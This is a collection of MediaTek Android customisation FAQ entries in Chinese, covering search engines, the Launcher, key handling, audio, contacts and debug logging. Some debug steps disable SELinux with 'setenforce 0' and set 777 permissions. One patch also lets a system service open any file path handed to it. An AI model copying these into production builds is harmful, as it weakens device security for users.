## [默认值]  [FAQ06166]  怎么在某种语言下添加baidu搜索引擎,BING 显示为中文，并将系统默认的搜索引擎修改成百度?

```text
1：去掉google搜索引擎修改方法：
在alps\mediatek\source\frameworks\res\res\values\donottranslate-search-engines.xml 中
有一个name为search_engines的array,将其中的google item删除掉即可删除中文下的google搜索引擎。
其他语言下方法类似，在该res包中搜索search_engines的关键字找到其它语言的google搜索引擎，同样将
google的ITEM删除掉，即可删除其它语言下的google 搜索引擎。
2：如何设置BAIDU为默认引擎：
在quickSearhBox的源码中，有个SearchEngineItemControl.java的文件，修改其中的
DEFAULT_SEARCH_ENGINE的定义为baidu即可。
3：如何修改BING 显示为中文必应：
修改
alps\mediatek\source\frameworks\res\res\values\donottranslate-all_search_engines.xml 中
string-array name="bing_zh_CN" 内<item>的值为下面的内容即可
<string-array name="bing_zh_CN" translatable="false">
    ...
    <item>&#x5fc5;&#x5e94;</item>
    ...
</string-array>
如果只要验证baidu是否被添加进去,只需编译mediatek-res.apk, framework.jar,secondary-framewor.jar 并push 到手机重启即可验证.
如果要验证baidu是否有设为默认引擎,则需整个项目new下才能验证,我这边实验过恢复出厂设置不行,恢复后,还是上次
选中的搜索引擎.
```

## [browser]  [默认值]  [FAQ10763]  在中文简体状态下无法修改默认引擎，默认引擎一直都是百度

```text
项目在中文简体状态下无法修改默认引擎，默认引擎一直都是百度。如何改为Google?
[SOLUTION] 
如果是OP01项目：
修改
KK和KK以前的版本：OP01DefaultSearchEngine.java (alps\mediatek\operator\op01\packages\apps\plugins\src\com\mediatek\qsb\plugin)
L和L以后的版本：OP01DefaultSearchEngine.java /vendor/mediatek/proprietary/operator/OP01/packages/apps/Plugins/src/com/mediatek/qsb/plugin/
中
public static final String SERCH_ENGIN_GOOGLE = "google";//BrowserSetting
public String getSearchEngine(SharedPreferences mPrefs) {
    Xlog.i(TAG, "Enter: " + "getSearchEngine" + " --OP01 implement");
    return mPrefs.getString(PREF_SEARCH_ENGINE, SERCH_ENGIN_GOOGLE);
}
同时为保证 quickSearchBox那边的一致, quickSearchBox部分也要修改
OP01DefaultSearchEngine.java (alps\mediatek\operator\op01\packages\apps\plugins\src\com\mediatek\qsb\plugin) 
中改为google
public static final String DEFAULT_SEARCH_ENGINE = "google";
 
如果不是OP01的项目应该修改
1：KK和KK以前的版本：Donottranslate-new-search_engines.xml (alps\mediatek\frameworks\base\res\res\values)
L和L以后的版本： /vendor/mediatek/proprietary/frameworks/base/res/res/values/
values-zh-rtw
values-zh-rcn 这三个目录，将google作为第一个搜索引擎。
```

## [FAQ06192]  设置 > 个人 > 安全 > 凭据存储 的作用

```text
使用证书 您可以使用数字证书标识设备，以实现多种目的，包括 VPN 或 Wi-Fi 网络访问，以及“电子邮件”或 Chrome 浏览器等应用对服务器的身份验证。在您的系统管理员的帮助下进行使用；并将其安装在设备的受信任凭据存储上。
Android 支持以 .crt 或 .cer 扩展名的文件形式保存的 DER 编码 X.509 证书。如果您的证书文件带有 .der 或其他扩展名，则必须将其更改为 .crt 或 .cer，否则无法安装。
Android 也支持以 .p12 或 .pfx 扩展名的 PKCS#12 密钥库文件形式保存的 X.509 证书。如果您的密钥库文件带有其他扩展名，则必须将其更改为 .p12 或 .pfx，否则无法安装。通过 PKCS#12 密钥库安装证书时，Android 会同时安装所有随附的私有密钥或证书授权中心的证书。
安装客户端证书和 CA 证书
要从平板电脑的内存设备安装证书，请按以下步骤操作：
将证书或密钥库从计算机复制到设备的内存设备的根目录下（也就是说，不要复制到某个文件夹中）。 
依次转到设置  > 个人 > 安全 > 凭据存储 > 从存储设备安装。 
触摸证书或密钥库的文件名即可安装。系统只显示您尚未安装的证书。 
根据系统提示输入密钥库的密码，然后触摸确定。 
为该证书输入一个名称，然后触摸确定。 
通常，系统会同时安装客户端证书随附的 CA 证书。您也可以通过相同步骤安装单独的 CA 证书。
如果您尚未设置设备的图案、PIN 或密码，则系统会提示您设置一个。您的系统管理员可能会预先确定可接受的锁定类型。
现在，您可以在连接到安全网络时使用安装的证书，或将该证书用于“电子邮件”、“浏览器”和第三方应用的客户端身份验证。证书成功安装后，系统会删除存储设备中的副本。
重要提示：对于“电子邮件”和“浏览器”等支持证书的应用，可直接从应用内部安装证书。有关详情，请参阅各应用随附的帮助信息或其他说明。
使用 CA 证书
依次触摸设置 > 个人 > 安全 > 凭据存储 > 受信任的凭据。“受信任的凭据”屏幕有以下两个标签： 
系统显示永久安装在手机 ROM 中的证书授权中心 (CA) 的证书。
用户显示您自行安装的所有 CA 证书，例如安装客户端证书过程中安装的 CA 证书。
要查看 CA 证书的详情，请触摸其名称。相应详情会显示在滚动屏幕中。 
要删除或停用 CA 证书，请向下滚动到详情屏幕的底部，然后触摸停用（适用于系统证书）或删除（适用于用户证书）。 
当您停用系统 CA 证书后，其详情屏幕底部的按钮会变成启用，以便您在需要时重新启用该证书。当您删除用户安装的 CA 证书后，该证书会永久消失，必须重新安装才能再次获得该证书。
在出现的确认对话框中，点击确定。
```

## [FAQ12169]  点击进入quick search box，搜索不到通话记录

```text
1:在quick search box中,进入设置->可搜索项->勾选通话记录。
2：在quick search box中选择全部，搜索，搜索不到通话记录。

搜索不到通话记录的原因是因为call log不是default enabled 的corpus， 
目前google  default的搜索规则在搜索全部时很怪，搜索全部时， 不是
真正的去搜索全部的，而是去搜索default enabled的，但是当default
enabled的(例如网络)不被勾选时，它又可以多去搜索一个非default的。
所以去掉网络就可以搜索到calllog.
如果想要保证搜索全部时可以搜索到calllog，需要把calllog设置成default 搜索项，
同时因为添加了一个default可搜索项目，需要
将QuickSearchBox 代码中
Config.java内的NUM_PROMOTED_SOURCE 的值加一，即修改为4.
同时修改QuicksearchBox中的config.xml
将default_corpora中添加callLog的项目
<string-array name="default_corpora" translatable="false">
    <item>web</item>
    <item>apps</item>
    <item>com.android.dialer/.com.mediatek.dialer.activities.CallLogSearchResultActivity</item>
    <item>com.android.providers.applications/.ApplicationLauncher</item>
</string-array>
或者将calllog的uri添加到default_corpora_suggest_uris中去
<string-array name="default_corpora_suggest_uris" translatable="false">
    <item>content://com.android.contacts/search_suggest_query</item>
    <item>content://call_log/search_suggest_query</item>
</string-array>
```

## [FAQ10764]  快速搜索(QuickSearchbox)怎么关联应用(apk)

```text
快速搜索(QuickSearchbox)怎么关联应用（apk）
[SOLUTION] 
要实现一个自己的contentProvider,并在searchable.xml中的searchSuggestAuthority 
配置上这个provider,同时provider返回的数据也有格式要求，返回的列应该是
_ID  TEXT_1  TEXT_2  ICON_1  ICON_2  INTENT_ACTION INTENT_DATA INTENT_DATA_ID NTENT_EXTRA_DATA QUERY SHORTCUT_ID SPINNER_WHILE_REFRESHING 
你的provider要响应的URI是
content://your.authority/optional.suggest.path/SUGGEST_URI_PATH_QUERY
其中optional.suggest.path是可选的，一般可以为空，所以贵司可以要handle的 uri是
content://your.authority/SUGGEST_URI_PATH_QUERY
而SUGGEST_URI_PATH_QUERY是SearchManager的一个常量，为"search_suggest_query"
所以要handler的URI是
content://your.authority/search_suggest_query
其中your.authority就是你在provider中定义的authority，也是searchable中的searchSuggestAuthority
 
如果要在选中全部时，输入就有搜索结果，必须在searchable.xml中设置android:queryAfterZeroResults="true"
如果在searchable.xml中没有设置，默认值就是false。

google官方可以参考的文档有
http://developer.android.com/guide/topics/search/index.html
http://developer.android.com/guide/topics/search/search-dialog.html
http://developer.android.com/guide/topics/search/adding-recent-query-suggestions.html
http://developer.android.com/guide/topics/search/adding-custom-suggestions.html
http://developer.android.com/guide/topics/search/searchable-config.html
```

## [FAQ18286]  设置里面App notification里面，短信应用选择Block all,但是在短信编辑界面自发自收短信，仍有提示音

```text
进入系统设置，Sound&notification--->Notification---->App notification--->Messaging--->Block all,
勾选Block all选项。
在短信应用里面，当前会话界面自发自收，如果停留在编辑界面，收到新信息会有提示音。（这一点非常重点，一定是要当前正在收发信息的会话才会有提示音。如果是其它号码发过来的，而没有停留在那个会话，那么收到信息不会有提示音）

[SOLUTION] 
block的if判断请参考如下修改方法，Thanks！
import android.app.AppOpsManager;
在 MessagingNotification.java 的 playInConversationNotificationSound 方法中：

AppOpsManager appOps = (AppOpsManager)context.getSystemService(Context.APP_OPS_SERVICE);
boolean isNotificationEnabled = appOps.checkOpNoThrow(AppOpsManager.OP_POST_NOTIFICATION,
context.getApplicationInfo().uid, context.getPackageName()) == AppOpsManager.MODE_ALLOWED;
if (!isNotificationEnabled || notiProf.needMute() || TextUtils.isEmpty(ringtoneStr)) {
// Nothing to play
return;
}
```

## [FAQ08624]  搜索设置为全部时无法搜索到短信，音乐

```text
搜索设置中选择了音乐和短信，音乐中此时有一首名为全城热恋的歌曲，但是在搜索时，如果输入"全"或者"全城"，都搜不到，只有输入"全城热"才可以搜到,

music两个字符搜索不到是正常现象,因为在
Searchable.xml (alps\packages\apps\music\res\xml) 
中有默认定义最小搜索需要3个字符.
<searchable xmlns:android="http://schemas.android.com/apk/res/android"
    android:label="@string/search_title"
    android:hint="@string/search_hint"
    android:includeInGlobalSearch="true"
    android:searchSuggestAuthority="media"
    android:searchSuggestPath="external/audio/search"
    android:searchSuggestThreshold="3"             ##这里有默认定义最少3个,如果需要,可以修改这个值.
    android:searchSuggestIntentAction="android.intent.action.VIEW"
    android:searchSettingsDescription="@string/search_settings_description" />

[FAQ13588]  [Audio APP] 在音乐中搜索歌曲, 至少需要输入三个字符才会启动搜索
```

## [FAQ18254]  开启TurboDownload后下载速度会比纯4G更慢吗?

```text
这种情况是存在的。
我们在下载前会根据之前wifi和mobile的速率设置比例，例如wifi为0.6，mobile为0.4，然后建立TCP connection进行下载。一旦建立起来之后，如果wifi速率变慢了，那么Turbo download就会比纯4G下载更慢。
目前无法做到动态配置速率比。
在网络状况良好的情况下是会加速的。不保证一定会比纯4G快

当下载的文件超过5M，并且wifi是connected状态，就会用两种方式进行下载。
涡轮下载不会看当前wifi的信号以及mobile data的信号值，而是根据当前统计的wifi速率及mobile速度设定一个ratio下去，例如wifi为0.5，mobile为0.5，如果之前并没有wifi或者mobile的统计信息，则会使用初始值0.5，0.5。
涡轮下载的时候，会根据当前的wifi和mobile速度动态调整ratio，在下一次再启用涡轮下载时，就会使用新的调整值。
```

## [FAQ17877]  [Image] L/M版本上修改gif/bmp的限制

```text
考虑到memory的问题，对较大的BMP，GIF图片都做了一些限制；
当前code中设置的值能够满足市面上大部分图片的尺寸要求；如需客制化，需要多测试是否会造成Low Memory问题.
如下地方修改:

/packages/apps/Gallery2/src/com/mediatek/gallery3d/util/DecodeSpecLimitor.java中：
// GIF: None LCA:20MB, LCA:10MB
private final static int MAX_GIF_FILE_SIZE = FeatureConfig.sIsLowRamDevice ? (10 * 1024 * 1024) : (20 * 1024 * 1024);
private final static long MAX_GIF_FRAME_PIXEL_SIZE = (long) (1.5f * 1024 * 1024); // 1.5MB
private final static String MIME_GIF = "image/gif";

// BMP & WBMP: NONE-LCA file size < 52MB, LCA file size < 6MB
private final static int MAX_BMP_FILE_SIZE = FeatureConfig.sIsLowRamDevice ? (6 * 1024 * 1024)
 : (52 * 1024 * 1024);
```

## [FAQ17755]  录制低画质的视频在WIN7上查看属性，发现高宽显示为空

```text
有客户反馈手机上录制低画质视频，把视频放到WIN7系统的电脑上，点右键查看视频的属性，视频高宽栏显示为空。 
 
这个是由于低画质录制的视频采用了H263编码，而Win7对H.263 支持不完善。可以看到，所有H263视频的高宽在WIN7上显示都是空的。
所以如果要避免此问题，可以修改视频录制的编码，比如H264。
```

## [sdcard]  [FAQ04247]  [Storage] 如何解压编译生成的system/data等带ext4文件系统的image

```text
在ubuntu系统下：
1.cd alps/out/host/linux-x86/bin/
2../simg2img <source_path>/data.img <target_path>/data_ext4.img
3.生成的data_ext4.img 即被解压出来的带有ext4 文件系统的image文件。
4.使用mount 命令把ext4 image挂载到某目录(temp_dir )
    sudo mount  -t ext4 <target_path>/data_ext4.img ~/<temp_dir>
5.这样就可以直接查看/修改文件系统内的类容。
注意 
如果调用./simg2img出现了错误，就将前面三个步骤省略，直接采用第四个步骤，将得到的回读img通过mout命令挂载。
```

## [sdcard]  [FAQ04137]  【sdcard-common】如何将emmc上的内置sdcard拿掉

```text
拿掉emmc上的内置T卡，将内置T卡空间分配给userdata区域使用。
[SOLUTION] 
for ICS(android 4.0)
   可在DCC上下载参考文档《Disable Internal fat partition_customer_4.0》进行修改。
for JB(android 4.1)
   可在DCC上下载参考文档《Disable Internal fat partition_customer_4.1》进行修改。
```

## [FAQ03434]  [Recovery] 恢复出厂设置之后如何将时间变为初始值

```text
Recovery.c (bootable\recovery):
#include <linux/rtc.h>
#include <sys/ioctl.h>
void set_rtc(void) {
    struct tm tm;
    int fd;
    tm.tm_sec = 0;
    tm.tm_min = 0;
    tm.tm_hour = 0;
    tm.tm_mday = 1;
    tm.tm_mon = 0;
    tm.tm_year = 2012-1900;
    fd = open("/dev/rtc0", O_WRONLY);
    if (fd != -1) {
        ioctl(fd, RTC_SET_TIME, &tm);
        close(fd);
    }
}
int
main(int argc, char **argv) {
...
中的
    } else if (wipe_data) {
....
 //
/*该else if代码最后 新增代码如下*/
set_rtc();
}
```

## [ota]  [FAQ03431]  [Recovery] OTA升级在recovery mode下无法返回normal mode

```text
请确认一下 mediatek/custom/<project>/uboot/inc/mt65xx_partition.h
里面的 NAND_WRITE_SIZE是设定为多少.如果您使用的nand flash，请确认NAND_WRITE_SIZE此值是否与nand flash的page size一致。
```

## [性能]  [FAQ18223]  consys-reserve-memory use for which module

```text
reviewing the consys-reserve-memory of device，customer finds thare are different in different device;
so customer want to know those memory used for which module?
 
adb shell cat proc/mtk_memcfg/memory_layout
Lavender M: [PHY layout] consys-reserve-memory : 0xa9e00000 - 0xa9ffffff (0x200000) => 2MB
SM30: [PHY layout] consys-reserve-memory : 0x5fe00000 - 0x5fefffff (0x100000) => 1MB

[Answer] 
the 2M memory space is devided into three parts(512k for connectivity system, 512k for coredump space and 1M for GPS) in android M.
```

## [launcher]  [FAQ10434]  Home key 点亮屏幕后, 如何使手机不自动回到 launcher 界面

```text
有些项目会把 home key 配置成 wake key
这样, 按 home key 的时候就可以唤醒手机
但同时,home key 又会把当前的界面切到 launcher
如果只想让 home key 在黑屏时起到唤醒功能, 而不自动切换到 launcher
需要怎么做?
 
[SOLUTION] 
注意: 黄色背景部分代码为所添加的代码
L、M
修改phonewindowmanager.java 中 interceptKeyBeforeQueueing 方法的下面这段 code:

// Basic policy based on interactive state.
int result; //参考行
//add  begin
if ( keyCode == KeyEvent.KEYCODE_HOME && !isScreenOn()) {
       policyFlags |= WindowManagerPolicy.FLAG_WAKE;
}
//add end
boolean isWakeKey = (policyFlags & WindowManagerPolicy.FLAG_WAKE) != 0
|| event.isWakeKey(); //参考行

KK
1: 修改 phonewindowmanager.java 中 interceptKeyBeforeQueueing 方法的下面这段 code:
if (keyCode == KeyEvent.KEYCODE_POWER) {
    policyFlags |= WindowManagerPolicy.FLAG_WAKE;
}
改为:
if (keyCode == KeyEvent.KEYCODE_POWER || (keyCode == KeyEvent.KEYCODE_HOME && !isScreenOn)) {
    policyFlags |= WindowManagerPolicy.FLAG_WAKE;
}

2: 仍然是此方法,对应部分修改为如下:
int result; //参考行

if (((isScreenOn && !mHeadless) || (isInjected && !isWakeKey))) {//参考行
    // When the screen is on or if the key is injected pass the key to the application.
    Log.d(TAG,"oldScreenOn = "+oldScreenOn); 
    if(!oldScreenOn && (keyCode == KeyEvent.KEYCODE_HOME)){
        Log.d(TAG,"eat the home up because home down has dropped");
        result |= ACTION_WAKE_UP;
    }else{
        result = ACTION_PASS_TO_USER;
    }
} else {
    // When the screen is off and the key is not injected, determine whether
    // to wake the device but don't pass the key to the application.
    result = 0;
    if (down && isWakeKey && isWakeKeyWhenScreenOff(keyCode)) {
           ...... 
    }
}
oldScreenOn = isScreenOn;

其中的 oldScreenOn 请定义在 phoneWindowManager 这个 class 中, 定义如下:
boolean oldScreenOn = true;
```

## [launcher]  [FAQ15186]  Launcher3如何调整滑动灵敏度?

```text
请修改Launcher3的PagedView.java中的变量：
private static final float SIGNIFICANT_MOVE_THRESHOLD = 0.4f;
请将这个变量变小。
Note：此修改L上会同时影响桌面和主菜单，M上只会影响桌面的滑动速度。
```

## [launcher]  [FAQ13295]  手机插SIM卡启动，Launcher会闪一下，如何避免?

```text
手机插SIM卡启动，Launcher会闪一下，如何避免?
[SOLUTION] 
KK/L0/L1/M0:
1. 在AndroidManifest.xml中修改Launcher这个Activity的属性，加上android:configChanges="mcc|mnc"。
2. 在Launcher.java中增加如下方法：
@Override
public void onConfigurationChanged(Configuration newConfig) {
    Log.d(TAG, "onConfigurationChanged() called.");
    super.onConfigurationChanged(newConfig);
}
KK/L0/L1:
3. 在LauncherModel.java的onReceive方法中，找到action等于Intent.ACTION_CONFIGURATION_CHANGED的分支，注释掉mcc/mnc变化时调用的forcereload()这行代码。
```

## [FAQ18182]  更改WiFi加密方式后，在WLAN列表中重复显示WIFI热点名称

```text
测试机连接搭建的WiFi热点--路由器更换加密方式--进入设置--WALN列表，在WLAN列表中重复显示WIFI热点名称。
这种现象是正常行为，因为config的定义是，SSID + key management，只要有一者不一样，就是不同config。
如果要修改这个行为，请修改如下：
/frameworks/base/packages/SettingsLib/src/com/android/settingslib/wifi/AccessPoint.java
public void clearConfig() {
    mConfig = null;
    networkId = WifiConfiguration.INVALID_NETWORK_ID;
+ /// M: set AP rssi as default value when updateAccessPoints
+ mRssi = Integer.MAX_VALUE;
}
```

## [FAQ18237]  [Legacy Wi-Fi] Adb如何获取所连接AP的RSSI

```text
下载eng load，adb如何获取所连接AP的RSSI
adb shell wpa_cli -iwlan0 -g@android:wpa_wlan0 IFNAME=wlan0 SIGNAL_POLL
```

## [FAQ18187]  切换飞行模式SIM联系人是否应该显示?

```text
这个与项目配置中的 MTK_FLIGHT_MODE_POWER_OFF_MD 有关系：默认设置是true，是为了省电；
如果期望打开飞行模式，SIM联系人继续显示，可以设置此项为false即可。
详细您可以参考 [FAQ08682]  [SIM] 开关飞行模式引起modem关闭和打开这个与项目
```

## [FAQ17655]  SIM卡联系人无法收藏

```text
1. SIM卡联系人界面没有收藏功能选项；
2. 需要在收藏联系人界面和快速拨号界面显示收藏后的SIM卡联系人。
 
[SOLUTION] 
 
敝司设计时，故意屏蔽掉了SIM卡联系人。

[原因]  SIM卡联系人在重开机/开关飞行模式/热插拨操作后，都会执行删除之前导入的并重新导入操作，
这样会导致您之前设定的 收藏 / 快速拨号 丢失，所以敝司专门屏蔽掉SIM联系人，

----------------------------------------------------------------------------------------------------------------------
如果不介意重开机/开关飞行模式/热插拨操作后设置的信息又丢失的Case，可以尝试如下修改对SIM卡联系人进行收藏。
----------------------------------------------------------------------------------------------------------------------
修改1. SIM卡联系人可以收藏
FILE: /packages/apps/Contacts/src/com/android/contacts/quickcontact/QuickContactActivity.java
public boolean onPrepareOptionsMenu(Menu menu) {
    if (mContactData != null) {
        final MenuItem starredMenuItem = menu.findItem(R.id.menu_star);
        ContactDisplayUtils.configureStarredMenuItem(starredMenuItem, 
        mContactData.isDirectoryEntry(), mContactData.isUserProfile(),
        mContactData.getStarred());
        
        // 下面这个地方就是您需要修改的地方，拿掉即可。 
        /// M: Disable sim contact star menu.
        if (mContactData.getIndicate() > 0) {
            starredMenuItem.setVisible(false);
        }
        ... ...
修改2. 收藏的SIM卡联系人在收藏列表和快速拨号列表显示
FILE: /packages/apps/Contacts/src/com/android/contacts/quickcontact/ContactTileLoaderFactory.java
public static CursorLoader createStrequentLoader(Context context) {
    /** M: Bug Fix for CR ALPS00319593 @{ */
    CursorLoader cursorLoader = new CursorLoader(context,
    Contacts.CONTENT_STREQUENT_URI, COLUMNS,
    Contacts.INDICATE_PHONE_SIM + "=-1 ", null, null);
    ContactsPreferencesUtils.fixSortOrderByPreference(cursorLoader, DISPLAY_NAME, context);
    return cursorLoader;
    /** @} */
}

public static CursorLoader createStrequentPhoneOnlyLoader(Context context) {
    Uri uri = Contacts.CONTENT_STREQUENT_URI.buildUpon().appendQueryParameter(ContactsContract.STREQUENT_PHONE_ONLY, "true").build();
    
    /** M: Bug Fix for CR ALPS00319593 @{ */
    CursorLoader cursorLoader = new CursorLoader(context, uri, COLUMNS_PHONE_ONLY, Contacts.INDICATE_PHONE_SIM + "=-1 ", null, null);
    ContactsPreferencesUtils.fixSortOrderByPreference(cursorLoader, DISPLAY_NAME, context);
    return cursorLoader;
    /** @} */
}
将以上两个方法中的 Contacts.INDICATE_PHONE_SIM + "=-1 " 修改为 NULL。
例如：
将
CursorLoader cursorLoader = new CursorLoader(context, uri, COLUMNS_PHONE_ONLY, Contacts.INDICATE_PHONE_SIM + "=-1 ", null, null);
修改为：
CursorLoader cursorLoader = new CursorLoader(context, uri, COLUMNS_PHONE_ONLY, null, null, null);
```

## [FAQ17922]  微信，登陆闪退，无法登陆

```text
下载最新微信并登陆，下载最新微信并登陆。
1.提供对应的APK ,请确认测试机是否有写入IMEI ,WIFI MAC 地址，手机时间是否为当前网络时间
2.是否有先進行ATTK provisioning
$ adb shell soter_attk_provision
 
根據SOTER spec v2.3.1 SOTER方案OEM厂商微信接入指引 1.0.1.pdf
廠商必須在產線生產的時候同時燒入ATTK到RPMB
我司有提供一個provision command出來，可以透過adb進行attk provision動作
如下：
$ adb shell soter_attk_provision
```

## [FAQ17911]  开启节电助手，终端收到来电时不振动

```text
来电震动的代码在alps\packages\services\telecomm\src\com\android\server\telecom\Ringer.java
private void startRingingOrCallWaiting方法中，修改其中的代码逻辑即可。
```

## [log]  [FAQ18232]  如何打开MDP debug Log

```text
当MDP出问题后，需要打开dpframework的开关才能在userdebug版本抓到完整的log.

为了使得在user版本上也能够打印出mdp和dpframework的log可以进行以下动作:
直接修改代码，然后复现问题后把整包mtklog传给mtk.
DpConfig.h (vendor\mediatek\proprietary\hardware\dpframework\include)
#define CONFIG_FOR_TPIPE_FINFO      0      // enable tile setting per tile
#define CONFIG_FOR_DUMP_COMMAND     0      // dump command.bin
#define CONFIG_FOR_SYSTRACE         0      // enable systrace
```

## [FAQ18233]  如何dump mdp(DpBlitStream mode) buffer

```text
当图片出现异常后，为了理清问题，经常需要dump mdp buffer来理清是否为mdp 出错

[SOLUTION] 
dump buffer的过程有以下两种方法.
(1)方法1：dump到默认的path: Dump folder : /sdcard/mdp/
adb shell setprop dpframework.dumpbuffer.enable 1

(2) 方法2: dump到制定的path: Change Dump folder : /data/mdp/
The dump folder is defined in DpPortAdapt.h

Command: 
1. adb shell setenforce 0 
2. adb shell mkdir /data/mdp
3. adb shell chmod 777 /data/mdp
4. adb shell setprop dpframework.dumpbuffer.enable 1
```

## [ota]  [FAQ14500]  [Audio Common]  OTA升级音频参数后如果不恢复工厂设置也能生效

```text
OTA升级默认只更新：boot.img, recovery.img, system.img
不会更新data区，但由于NVRAM存在于data区，所以OTA升级音频参数后需要恢复工厂设置才能生效，
但是恢复工厂设置导致data区user的其他数据也被擦除，不符合需求 
[SOLUTION] 
Custom_NvRam_LID.h中每个data都对应一个VERNO即version number
/* audio file version */
#define AP_CFG_RDCL_FILE_AUDIO_LID_VERNO   "001" 
reboot时，当检测到VERNO有变化会重新生成新的NVRAM
所以只需要将对应项的VERNO如"001"改成不一样如"002"就可以了!
 
建议OTA时把此.h中所有的#define AP_CFG_***_LID_VERNO后面的number都改下！
```

## [FAQ15504]  [Audio Profile] 设置->情景模式->音效改善下面BesAudEnh、BesLoudness、BesSurround和无损蓝牙模式四个选项的默认值

```text
设置->情景模式->音效改善下面BesAudEnh、BesLoudness、BesSurround和无损蓝牙模式四个选项的默认值
[SOLUTION] 
1. 关于BesAudEnh，
默认值是在 vendor\mediatek\proprietary\custom\common\cgen\cfgdefault\audio_audenh_control_option.h
#define DEFAULT_AUDIO_AUDENH_CONTROL_OPTION_Coeff (0x00000002) //Bit0: Audenh default (Default off for Low Power) , Bit1: BesLoudness default
0x00000000 表示BesAudEnh关闭
0x00000001 表示BesAudEnh打开
2. BesLoudness
同上
0x00000002 表示 BesAudEnh关闭，BesLoudness打开
0x00000003 表示 BesAudEnh打开，BesLoudness打开
3. BesSurround
这个直接修改AudioProfileService.java里的mIsBesSurroundEnable
4. 无损蓝牙模式
/frameworks/av/services/audioflinger/AudioLosslessBTBroadcast.cpp 中，
将
mIsLosslessBTOn = (property_get(LOSSLESS_BT_PROP_NAME, value, "0") > 0) && (atoi(value) == 1);
改为：
mIsLosslessBTOn = (property_get(LOSSLESS_BT_PROP_NAME, value, "1") > 0) && (atoi(value) == 1);
```

## [FAQ15498]  【AudioProfile】如何判断当前文件是否存在?（system无权限读取SD card问题feature的规避）

```text
在AudioProfile这边，是用isRingtoneExist()这个API来判断文件是否存在，但是Android5.1上google对system访问SD卡做了权限，而导致该API失效。 后来增加了validRingtoneUri这个API来去判断database里的URI存不存在，。 validRingtoneUri的缺点是一旦遇到文件已经不存在，但是database没有更新，就会有问题。 现提供新的判断方法。

[SOLUTION] 
1. alps\vendor\mediatek\proprietary\frameworks\common\src\com\mediatek\common\audioprofile\IAudioProfileService.aidl
增加
boolean isRingtoneCanOpen(String UriData);

2. AudioProfileManager.java
增加
public boolean isRingtoneCanOpen(String UriData){
IAudioProfileService service = getService();
    try {
        return service.isRingtoneCanOpen(UriData);
    } catch (RemoteException e) {
        Log.e(TAG, "Dead object in isRingtoneCanOpen", e);
        return false;
    }
}

3. AudioProfileService.java
增加定义
private static final String GET_FILE_IS_EXIST = "GetFileIsExist: ";
增加API
public boolean isRingtoneCanOpen(String UriData){
    Log.d(TAG, "isRingtoneCanOpen() UriData= "+UriData);
    boolean ret=false;
    String validUri=null;
    // handle non-file sources
    String path= GET_FILE_IS_EXIST + UriData;
    validUri = mAudioManager.getParameters(path);
    Log.d(TAG, "isRingtoneCanOpen() validUri = "+validUri +", path= "+path);
    ret = validUri.equals("-1") ? false : true;
    return ret;
}

3. AudioFlinger.cpp

开头增加定义

char GET_FILE_IS_EXIST[]  = "GetFileIsExist: "; // ddd file open



在 getParameters()的开头部分增加如下：

ALOGD("+%s(): %s", __FUNCTION__, keys.string());

//start ddd file open

String8 result;

char* strTag;

int lenKey = keys.length();

int lenTag = strlen(GET_FILE_IS_EXIST);

ALOGD("ddd getParameters(): lenKey=%d", lenKey);

 

strTag = strstr(keys, GET_FILE_IS_EXIST);

ALOGD("getParameters(): strTag=%s", strTag);

 

if(lenKey > lenTag && strTag!=NULL){

char* url = strTag + lenTag;

ALOGD("getParameters(): url=%s", url);

 

FILE *m_pInputFile;

m_pInputFile = fopen(url, "r");

if(m_pInputFile == NULL)

{

ALOGE("ddd Couldn't open fd for %s", url);

result = "-1";

}else {

ALOGE("ddd can open fd for %s", url);

result = "9";

fclose(m_pInputFile);

}

return result;

}

//end modify ddd file open

 

4. ringer.java

在startRingingOrCallWaiting()里调用 ValidRingtoneUri 的地方，增加如下，并且将ValidRingtoneUri 改用 isRingtoneCanOpen

String dataKey = audioProfileMgr.getDataKey(audioProfileMgr.getStreamUriKey(audioProfileMgr.getActiveProfileKey(), AudioProfileManager.TYPE_RINGTONE, slotId));

String uriData = Settings.System.getString(mContext.getContentResolver(), dataKey);

Log.d(this, " uriData: "+uriData);

 

if( false==audioProfileMgr.isRingtoneCanOpen(uriData)){

// if( -1==RingtoneManager.validRingtoneUri(mContext, ringtoneUri)){

Log.d(this, "default ");

ringtoneUri = audioProfileMgr.getDefaultRingtone(AudioProfileManager.TYPE_RINGTONE);

}

5. RingtoneManager.java

将getRingtone()里用到ValidRingtoneUri的地方，可以添加判断条件，将其屏蔽掉，因为在ringer.java里面已经有判断当前文件是否存在
```

## [FAQ10435]  如何让 app 自行处理 power key

```text
Power key 通常都是由 framework 自行的
app 无法拿到这个 key 值
 
如果想让某个 app 自行处理 power key
应该要怎么做呢?
 
[SOLUTION] 
L、M 
修改PhoneWindowManager的interceptKeyBeforeQueueing方法：
     ....
case KeyEvent.KEYCODE_POWER: {
result &= ~ACTION_PASS_TO_USER;
isWakeKey = false; // wake-up will be handled separately
 
//com.example.adc为要处理power key的包名
if(win != null && win.getAttrs() != null&&win.getOwningPackage().equals("com.example.adc")){
return 1;// return 1事件就传给app处理
}
if (down) {
interceptPowerKeyDown(event, interactive);
} else {
interceptPowerKeyUp(event, interactive, canceled);
}
break;
}
 
如果只想让power键让某个Activity处理，将以上的if条件改为：
if(win != null && win.getAttrs() != null&&win.getAttrs().getTitle().equals("xxx.xxx.xxx.xxxActivity")){
return 1;// return 1 就会传给 xxx.xxx.xxx.xxxActivity处理
}
 
KK、JB
1: 修改 phoneWindowManager.java 的 interceptKeyBeforeQueueing 方法,在 reference line 后加入下面这段代码
case KeyEvent.KEYCODE_POWER: { //reference line
 result &= ~ACTION_PASS_TO_USER; //reference line
  // add begin
 ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
 try{
  if (activityManager.getRunningTasks(1).get(0).topActivity.getPackageName().equals("your_special_package_name")){ 
   //Please reset the special package name.
   result |= ACTION_PASS_TO_USER;
   Xlog.d(TAG,"detect power key in special package, pass to user!")
  }
 }catch(NullPointerException e){
  Xlog.d(TAG,"ingore a NullPointerException ..");
 }
 //add end
 
2: 同样在此分支内, 找到 else 语句段, 并找到如下位置加入
if (interceptPowerKeyUp(canceled || mPendingPowerKeyUpCanceled)) { //参考行
      if(!((result & ACTION_PASS_TO_USER) == ACTION_PASS_TO_USER)){ //加入行
          result = (result & ~ACTION_WAKE_UP) | ACTION_GO_TO_SLEEP; //原有代码
      } //加入行
}

注意: 以上蓝色背景部分的内容需要替换为您预期要处理 power key 的 app 对应的 package name.
```

## [FAQ18170]  录像的时候添加Previewcallback

```text
客户希望在录像的时候，能够在AP获取Previewcallback的数据进行处理。
  
[SOLUTION] 
 
